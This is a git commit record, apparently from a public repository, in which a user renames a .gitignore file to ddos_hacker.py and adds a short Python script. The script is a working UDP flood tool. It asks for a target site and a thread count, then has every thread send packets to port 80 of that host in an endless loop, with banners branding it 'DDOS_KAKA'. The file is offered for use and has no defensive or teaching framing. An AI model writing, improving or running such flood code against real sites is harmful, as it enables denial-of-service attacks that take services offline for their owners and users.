c5e8ab03c824968e92adc9f47847779035f2ae59
Hacker-samy <126173507+Hacker-samy@users.noreply.github.com>
2023-02-23 18:38:59 +0330

    Update and rename .gitignore to ddos_hacker.py

---
+++ ddos_hacker.py
@@ -0,0 +1,32 @@
+import time
+import socket
+import sys
+import _thread
+print("<=###### DDOS_KAKA ######=>")
+print("soroush : @hacka")
+print("<==# hackeran kolah sefid #==>")
+print("<==# hacker samy #==>")
+print("<==#     ddos_kaka #==>")
+print("<==# # ddos_kaka #==>")
+print("<==# # hacker samy# #==>")
+print("##<<<hacker samy>>>##")
+site = input("Enter your site url => ")
+thread_count = input("Enter your thread => ")
+ip = socket.gethostbyname(site)
+UDP_PORT = 80
+MESSAGE = 'virus32'
+print("UDP target IP:", ip)
+print("UDP target port:", UDP_PORT)
+time.sleep(3)
+def ddos(i):
+    while 1:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
+        print("<=DDOS_KAKA hacker samy package sent=>")
+for i in range(int(thread_count)):
+    try:
+        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
+    except KeyboardInterrupt:
+        sys.exit(0)
+while 1:
+    pass
